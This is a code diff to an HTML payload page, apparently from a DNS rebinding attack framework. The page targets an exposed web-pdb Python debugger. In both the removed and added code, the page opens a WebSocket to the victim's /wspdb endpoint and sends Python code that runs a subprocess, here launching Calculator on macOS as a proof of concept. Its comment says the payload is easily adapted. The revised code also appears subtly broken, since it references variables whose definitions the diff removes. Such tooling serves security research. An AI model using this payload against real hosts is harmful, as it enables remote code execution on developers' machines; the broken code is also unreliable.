@@ -5,60 +5,20 @@ It opens the "Calculator" application on macOS.
 The payload can be easily modified to target different OSes or implementations.
 The TCP port varies.
 -->
+<!doctype html>
 <html>
 
 <head>
     <title>payload-exposed-webpdb</title>
     <script src="payload.js"></script>
     <script>
-        function attack() {
-            let response;
-            let data;
-            let loc;
-            // fetch page that must exist on attacker host but not on target host.
-            fetch('/')
-                .then(function (r) { //response
-                    response = r;
-                    if (response.ok) {
-                        // We don't follow the usual pattern here:
-                        // HTTP 200 means that we have not contacted the target yet.
-                        throw new Error('200')
-                    } else if (response.status == 404) {
-                        console.log("attack frame ", window.location.hostname, " received a response")
-                        loc = window.location;
-                        return response.text()
-                    }
-                })
-                // fetch PDB websockets URL that from target host.
-                .then(function (j) {
-                    let wsURL = "ws://" + location.hostname + ":" + loc.port +
-                        "/wspdb"
-                    console.log(wsURL);
-                    exploit(wsURL);
-                    attackSuccess(wsURL);
-                })
-                .catch(function (error) {
-                    if (error instanceof TypeError) { // We cannot establish an HTTP connection
-                        console.log("frame " + window.location.hostname + " could not load");
-                        window.parent.postMessage({
-                            status: "error"
-                        }, "*");
-                    } else if (error.message == 'hastoken') {
-                        console.log('DNS rebinding did not happen yet')
-                    } else if (error.message == '200') { // We received a 200
-                        console.log("file not found. Frame " + window.location.hostname +
-                            " has not updated dns yet, waiting " + interval +
-                            " ms")
-                    } else { // We did not handle something
-                        console.log('Unhandled error: ' + error);
-                        window.parent.postMessage({
-                            status: "error",
-                        }, "*");
-                    }
-                })
-        }
+        // attack() is called once DNS rebinding is successful
+        // headers and body contains server data obtained 
+        // from the victim service during rebinding, if any.
+        function attack(headers, cookie, body) {
+            let wsURL = "ws://" + location.hostname + ":" + loc.port +
+                "/wspdb";
 
-        function exploit(url) {
             const ws = new WebSocket(url);
             ws.onopen = () => ws.send(
                 "import subprocess; subprocess.call([\"/usr/bin/open\", \"-W\", \"-n\", \"-a\", \"/Applications/Calculator.app\"])"
@@ -74,13 +34,9 @@ The TCP port varies.
     </script>
 </head>
 
-<body onload="begin()">
-    <p>
-        <h3>DNS Rebinding Vulnerability webpdb</h3>
-    </p>
-    <p>
-        This page is waiting for a dns update.
-    </p>
+<body onload="begin('/')" )>
+    <h3>webpdb Payload</h3>
+    <p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
 </body>
 
 </html>
